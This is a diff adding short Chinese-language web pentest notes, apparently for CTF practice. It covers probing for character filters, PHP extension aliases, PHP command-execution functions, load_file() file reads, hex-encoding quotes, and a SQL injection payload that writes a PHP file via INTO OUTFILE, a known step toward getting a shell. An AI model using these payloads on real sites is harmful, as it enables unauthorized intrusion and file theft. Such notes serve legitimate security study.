@@ -1,0 +1,21 @@
+首先看看是否有字符过滤，
+把所有字符串都试一遍
+
+.php?id = 1~!@$%^&*()_+-={}[]'";<>/?
+
+
+重定向一般发生在访问域名而且不加参数或者文件夹名、文件名这样的情况下，
+比如直接访问就会重定向到一个默认的页面文件。因该记住这个套路。
+
+
+php的别名：php2, php3, php4, php5, phps, pht, phtm, phtml
+
+
+PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec()
+
+导出数据库别名拿shell
+	整型：id=1 or 1=2 union select 1,'<?php phpinfo();?>' into outfile 'C:/2.php'--+
+	字符型：把单引号的语句转为hex值
+
+读文件load_file('文件路径')
+
